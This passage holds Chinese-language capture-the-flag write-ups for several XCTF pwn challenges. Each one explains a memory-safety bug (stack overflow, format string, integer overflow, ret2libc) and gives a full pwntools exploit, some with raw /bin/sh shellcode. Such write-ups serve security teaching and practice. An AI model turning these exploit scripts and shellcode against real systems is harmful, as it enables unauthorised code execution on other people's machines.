<code>system(&quot;/bin/sh&quot;)</code>。</p><ul><li>看看有价值的strings，除了输出的helloworld 还发现了“/bin/sh”，查看调用发现了 callsystem函数，我们可以把返回地址改成callsystem的地址。</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/8.png" alt="img"></p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/9.png" alt="img">双击bin/sh就能查看bin/sh的存储位置</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/10.png" alt="img">将光标放置在bin/sh这一行，按键盘上x就能找到哪里调用了bin/sh，这样我们就找到了callsystem。</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/11.png" alt="img"></p><p>那么我们到底需要输入多少个字节才能覆盖到返回地址呢？</p><ul><li>我们用pattern.py来确定溢出点的位置,使用如下命令来生成一串150个字节的字符串。</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/3.png" alt="img">* 然后我们使用gdb来进行调试</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/4.png" alt="img">* 指针并没有指向类似于0x3745413675413465那样地址，而是停在了vulnerable_function()函数中。因为程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/5.png" alt="img">* 虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/6.png" alt="img">* 然后我们再用pattern来计算溢出点</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level0/pic/7.png" alt="img">可以看到溢出点为136字节</p><ul><li>程序中有一个callsystem函数，我们可以把返回地址改成这个函数的地址。 最终执行system(“/bin/sh”)。构造payload：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;A&quot;*0x88 + elf.symbols[&quot;callsystem&quot;]</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process("./level0")</span></span><br><span class="line">elf = ELF(<span class="string">"./level0"</span>) </span><br><span class="line">p = remote(<span class="string">'10.10.49.194'</span>, <span class="number">30154</span>)</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">0x88</span> </span><br><span class="line">addr = elf.symbols[<span class="string">"callsystem"</span>]</span><br><span class="line">payload = <span class="string">""</span> </span><br><span class="line">payload += padding </span><br><span class="line">payload += p64(addr)</span><br><span class="line">p.send(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="攻防世界-level2"><a href="#攻防世界-level2" class="headerlink" title="攻防世界: level2"></a>攻防世界: level2</h1><h2 id="目标-4"><a href="#目标-4" class="headerlink" title="[目标]"></a><strong>[目标]</strong></h2><p>stack overflow,ROP</p><h2 id="环境-4"><a href="#环境-4" class="headerlink" title="[环境]"></a><strong>[环境]</strong></h2><p>Ubuntu</p><h2 id="工具-4"><a href="#工具-4" class="headerlink" title="[工具]"></a><strong>[工具]</strong></h2><p>gdb、objdump、python、pwntools, IDA</p><h2 id="过程分析-4"><a href="#过程分析-4" class="headerlink" title="[过程分析]"></a><strong>[过程分析]</strong></h2><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level2/pic/1.png" alt="img">- 栈不可执行，但是可以进行溢出。</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level2/pic/2.png" alt="img"></p><ul><li>发现字符串 bin/sh 和 system 函数，由此想到我们可以把 vulnerable_function 的返回地址修改成system函数的地址，然后把bin/sh字符串的地址也写入栈中，也就是system函数参数的位置上。构造如下payload：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*0x8c payload += p32(sys_addr) #覆盖返回地址到system函数 payload += p32(0x12345678)　#随意填写system函数调用结束的返回地址 payload += p32(bin_addr)　 #system函数的参数，指向“/bin/sh”</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./level2'</span>) </span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">sys_addr = elf.symbols[<span class="string">"system"</span>] </span><br><span class="line">bin_addr = elf.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8c</span> </span><br><span class="line">payload += p32(sys_addr) </span><br><span class="line">payload += p32(<span class="number">0x12345678</span>) </span><br><span class="line">payload += p32(bin_addr)</span><br><span class="line">p.recvline() </span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="攻防世界-string"><a href="#攻防世界-string" class="headerlink" title="攻防世界: string"></a>攻防世界: string</h1><h2 id="目标-5"><a href="#目标-5" class="headerlink" title="[目标]"></a><strong>[目标]</strong></h2><p>shellcode,format string bug</p><h2 id="环境-5"><a href="#环境-5" class="headerlink" title="[环境]"></a><strong>[环境]</strong></h2><p>Ubuntu</p><h2 id="工具-5"><a href="#工具-5" class="headerlink" title="[工具]"></a><strong>[工具]</strong></h2><p>gdb、objdump、python、pwntools, IDA</p><h2 id="过程分析-5"><a href="#过程分析-5" class="headerlink" title="[过程分析]"></a><strong>[过程分析]</strong></h2><ul><li>首先请自行理解一下程序的逻辑。</li><li>查看有哪些保护机制开启。</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/string/pic/1.png" alt="img">- 审计 sub_400CA6 函数的时候，发现一个比较可疑的地方</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/string/pic/2.png" alt="img">- 这句话的意思是：把v1强制转化成一个函数指针，然后调用这个函数。也就是说如果我们shellcode写到这个位置，就能直接调用。shellcode可以通过上面的read函数来写进去。</p><ul><li>那么如何才能让程序的执行流到达这个位置呢。需要让<code>*a1 == a1[1]</code>。a1是作为参数传进来的，通过回溯，我们发现 a1 就是在 main 函数中 定义的v3，是一个指向堆块的指针。其中<code>v3[0]=68</code>,<code>v3[1]=85</code>。也就是说当<code>v3[0]==v3[1]</code>时就能满足<code>*a1 == a1[1]</code>。可如何才能修改成功呢？</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/string/pic/3.png" alt="img">- 上图可知，有一个格式化字符串漏洞，可以进行任意地址写。接下来我们需要知道v3[0]的地址。</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/string/pic/4.png" alt="img">- 其实输出的 secret[0] 就是 我们需要的地址。</p><p>思路：现在 地址有了，利用格式化字符串 将 <code>*a1 == a1[1]</code>，成功进入脆弱点，写入shellcode。</p><ul><li>这道题有一点需要注意，这是一个64位的程序，在64位下，函数前6个参数依次保存在rdi、rsi、rdx、rcx、r8和r9寄存器中（也就是说，若使用”x$”，当1&lt;=x&lt;=6时，指向的应该依次是上述这6个寄存器中保存的数值），而从第7个参数开始，依然会保存在栈中。故若使用”x$”，则从x=7开始，我们就可以指向栈中数据了。</li><li>在输入address的时候，输入1234，并在 <code>printf(&amp;format, &amp;format)</code>前下一个断点，查看我们输入的地址在栈中的位置：</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/string/pic/5.png" alt="img">-完成exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./string"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"secret[0] is "</span>) </span><br><span class="line">addr = int(p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>],<span class="number">16</span>) </span><br><span class="line">log.success(<span class="string">"addr:"</span>+hex(addr))</span><br><span class="line">p.sendlineafter(<span class="string">"be:\n"</span>,<span class="string">"GG"</span>) </span><br><span class="line">p.sendlineafter(<span class="string">"up?:\n"</span>,<span class="string">"east"</span>) </span><br><span class="line">p.sendlineafter(<span class="string">"leave(0)?:\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"address\'\n"</span>, str(addr))</span><br><span class="line"><span class="comment"># 输出85个字节 就能把位于7$上的地址的内容改写位85</span></span><br><span class="line">p.sendlineafter(<span class="string">"is:\n"</span>, <span class="string">"%85c%7$n"</span>)</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode =<span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span> </span><br><span class="line">p.sendlineafter(<span class="string">"SPELL\n"</span>,shellcode) </span><br><span class="line">sleep(<span class="number">0.1</span>) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="攻防世界-guess-num"><a href="#攻防世界-guess-num" class="headerlink" title="攻防世界: guess_num"></a>攻防世界: guess_num</h1><h2 id="目标-6"><a href="#目标-6" class="headerlink" title="[目标]"></a><strong>[目标]</strong></h2><p>重写seed</p><h2 id="环境-6"><a href="#环境-6" class="headerlink" title="[环境]"></a><strong>[环境]</strong></h2><p>Ubuntu</p><h2 id="工具-6"><a href="#工具-6" class="headerlink" title="[工具]"></a><strong>[工具]</strong></h2><p>gdb、objdump、python、pwntools, IDA</p><h2 id="过程分析-6"><a href="#过程分析-6" class="headerlink" title="[过程分析]"></a><strong>[过程分析]</strong></h2><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/guess_num/pic/1.png" alt="img"></p><p>显然，这是一个简单的溢出题。只要将seed[0]值固定，rand()产生的数列就是可以预测的。又因为gets函数不限制输入的长度，所以我们可以在输入 name 的时候把seed[0]覆盖掉。</p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>* </span><br><span class="line">context.log_level = <span class="string">'debug'</span> </span><br><span class="line">p = process(<span class="string">"./guess_num"</span>) </span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">pay = <span class="string">"A"</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>) </span><br><span class="line">p.sendlineafter(<span class="string">"name:"</span>,pay)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>): </span><br><span class="line">p.sendlineafter(<span class="string">"number:"</span>,str(libc.rand()%<span class="number">6</span> + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> p.recv() </span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 攻防世界: cgpwn2</span><br><span class="line"></span><br><span class="line">## **[目标]**</span><br><span class="line"></span><br><span class="line">栈溢出</span><br><span class="line"></span><br><span class="line">## **[环境]**</span><br><span class="line"></span><br><span class="line">Ubuntu</span><br><span class="line"></span><br><span class="line">## **[工具]**</span><br><span class="line"></span><br><span class="line">gdb、objdump、python、pwntools, IDA</span><br><span class="line"></span><br><span class="line">## **[过程分析]**</span><br><span class="line"></span><br><span class="line">- 检查保护机制，没有canary，可以溢出。</span><br><span class="line"></span><br><span class="line">![img](https://adworld.xctf.org.cn/media/task/writeup/cn/cgpwn2/pic/1.png)</span><br><span class="line"></span><br><span class="line">- gets函数不限制输入的长度，这里可以溢出。</span><br><span class="line">- 利用前面所说的方法所处溢出点的位置</span><br><span class="line"></span><br><span class="line">![img](https://adworld.xctf.org.cn/media/task/writeup/cn/cgpwn2/pic/2.png)</span><br><span class="line"></span><br><span class="line">![img](https://adworld.xctf.org.cn/media/task/writeup/cn/cgpwn2/pic/3.png)</span><br><span class="line"></span><br><span class="line">- 溢出点是42个字节</span><br><span class="line">- 在找关键字符串的时候没有发现 bin/sh 。所以我们需要将bin/sh写到我们可以访问的地址中去。我们可以在输入name的时候把 bin/sh写进去。name位于bss段，bss段保存全局变量，加载地址不会因为地址随机化的开启而有所变化。</span><br><span class="line">- 将 system 的地址写到 hello 函数的返回地址中，同时将之前 bin/sh 的地址也写到栈中，作为system函数的参数。构造如下payload：</span><br></pre></td></tr></table></figure><p>payload = 42*’a’ + p32(sys_addr) + p32(bss_addr)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">完整exp如下：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&quot;./cgpwn2&quot;) </span><br><span class="line">p = process(&quot;./cgpwn2&quot;)</span><br><span class="line">bss_addr = 0x0804A080</span><br><span class="line">p.recv() </span><br><span class="line">p.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">cnt = 42</span><br><span class="line">sys_addr = elf.symbols[&apos;system&apos;]</span><br><span class="line">p.recv() </span><br><span class="line">rop = &apos;&apos; </span><br><span class="line">rop += cnt * &apos;a&apos; </span><br><span class="line">rop += p32(sys_addr) </span><br><span class="line">rop += &apos;a&apos;*4 </span><br><span class="line">rop += p32(bss_addr)</span><br><span class="line">p.sendline(rop) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="攻防世界-int-overflow"><a href="#攻防世界-int-overflow" class="headerlink" title="攻防世界: int_overflow"></a>攻防世界: int_overflow</h1><h2 id="目标-7"><a href="#目标-7" class="headerlink" title="[目标]"></a><strong>[目标]</strong></h2><p>利用整数溢出，栈溢出，ROP</p><h2 id="环境-7"><a href="#环境-7" class="headerlink" title="[环境]"></a><strong>[环境]</strong></h2><p>Ubuntu</p><h2 id="工具-7"><a href="#工具-7" class="headerlink" title="[工具]"></a><strong>[工具]</strong></h2><p>gdb、objdump、python、pwntools, IDA</p><h2 id="过程分析-7"><a href="#过程分析-7" class="headerlink" title="[过程分析]"></a><strong>[过程分析]</strong></h2><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/int_overflow/pic/1.png" alt="img"></p><ul><li>read 函数处可以进行溢出，但是需要经过 check_passwd 函数才能将跳出login。现在再看一下 check_passwd 函数内部，</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/int_overflow/pic/2.png" alt="img">有一个疑似可能造成整数溢出的一个点，我们再看一下此处的汇编代码。</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/int_overflow/pic/3.png" alt="img">call strlen 之后 返回值放在了al寄存器中，这是一个八位的积存器，也就是说如果 s 字符串的长度 大于255 就会造成 整数溢出。</p><p>那我们利用这个漏洞干什么呢，我们需要进到else里，将 read 读进来的 s 复制到 dest 中，是一个可以利用的栈溢出。</p><p>现在我们知道了可以通过整数溢出到达 栈溢出漏洞，修改程序执行流，使程序跳转到 what_is_this 中。</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/int_overflow/pic/4.png" alt="img">这样我们可以构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*24 + p32(addr_whatisthis)` `payload = payload.ljust(261,&quot;a&quot;)</span><br></pre></td></tr></table></figure><p>完整payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./int_overflow"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"1"</span>) </span><br><span class="line">p.sendlineafter(<span class="string">"username:\n"</span>,<span class="string">"YmCold"</span>)</span><br><span class="line">payload = <span class="string">""</span> </span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">24</span> </span><br><span class="line">payload += p32(<span class="number">0x804868b</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">261</span>,<span class="string">"A"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"passwd:\n"</span>,payload) </span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure><h1 id="攻防世界-level3"><a href="#攻防世界-level3" class="headerlink" title="攻防世界: level3"></a>攻防世界: level3</h1><h2 id="目标-8"><a href="#目标-8" class="headerlink" title="[目标]"></a><strong>[目标]</strong></h2><p>stack overflow,ROP</p><h2 id="环境-8"><a href="#环境-8" class="headerlink" title="[环境]"></a><strong>[环境]</strong></h2><p>Ubuntu</p><h2 id="工具-8"><a href="#工具-8" class="headerlink" title="[工具]"></a><strong>[工具]</strong></h2><p>gdb、objdump、python、pwntools, IDA</p><p>这道题涉及到延迟绑定的内容。 请参阅 参考阅读下的链接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./level3'</span>) </span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>) </span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">cnt = <span class="number">140</span> </span><br><span class="line">vul_func = <span class="number">0x0804844b</span></span><br><span class="line">p.recv() </span><br><span class="line">payload1 = <span class="string">'a'</span>*cnt + p32(elf.symbols[<span class="string">'write'</span>]) + p32(vul_func) </span><br><span class="line">payload1 += p32(<span class="number">1</span>) + p32(elf.got[<span class="string">'write'</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload1) </span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>)) </span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr: "</span>+hex(write_addr)</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">'write'</span>] </span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</span><br><span class="line">bin_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bin_addr: "</span>+hex(bin_addr) </span><br><span class="line">payload2 = <span class="string">'a'</span>*cnt + p32(system_addr) + p32(vul_func) + p32(bin_addr) p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="攻防世界-level1"><a href="#攻防世界-level1" class="headerlink" title="攻防世界: level1"></a>攻防世界: level1</h1><h2 id="目标-9"><a href="#目标-9" class="headerlink" title="[目标]"></a><strong>[目标]</strong></h2><p>stack overflow,ROP</p><h2 id="环境-9"><a href="#环境-9" class="headerlink" title="[环境]"></a><strong>[环境]</strong></h2><p>Ubuntu</p><h2 id="工具-9"><a href="#工具-9" class="headerlink" title="[工具]"></a><strong>[工具]</strong></h2><p>gdb、objdump、python、pwntools, IDA</p><h2 id="过程分析-8"><a href="#过程分析-8" class="headerlink" title="[过程分析]"></a><strong>[过程分析]</strong></h2><ul><li>查看有哪些保护机制开启：</li></ul><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level1/pic/1.png" alt="img">- 没开canary，也没有开栈不可执行。</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/level1/pic/2.png" alt="img"> - vulnerable_function()里可以进行溢出，我们可以在栈中填写shellcode，执行来拿到shell权限。这里我们使用一段执行execve (“/bin/sh”)命令的语句作为shellcode。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot; shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot; shellcode += &quot;\x0b\xcd\x80&quot;</span><br></pre></td></tr></table></figure><ul><li>同 level0,找到溢出点的位置。容易计算出PC返回值的覆盖点为140个字节。我们只要构造一个”A”*140+ret字符串，就可以让pc执行ret地址上的代码了。</li><li>shellcode起始地址在哪呢？shellcode是通过输入buf的时候写入的，所以就是buf的地址，而buf的地址会在程序运行过程中给出.</li><li>此时shellcode的地址，溢出点和返回地址都有了，我们可以写出下面的exp：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./level1"</span>) </span><br><span class="line">s = p.readline() </span><br><span class="line">padding = <span class="number">0x88</span>+<span class="number">4</span></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span> shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span> </span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line">addr = p32(int(s[len(<span class="string">"What's this:"</span>):<span class="number">-2</span>],<span class="number">16</span>))</span><br><span class="line">payload = shellcode payload += <span class="string">'A'</span>*(padding-len(shellcode)) </span><br><span class="line">payload += addr</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
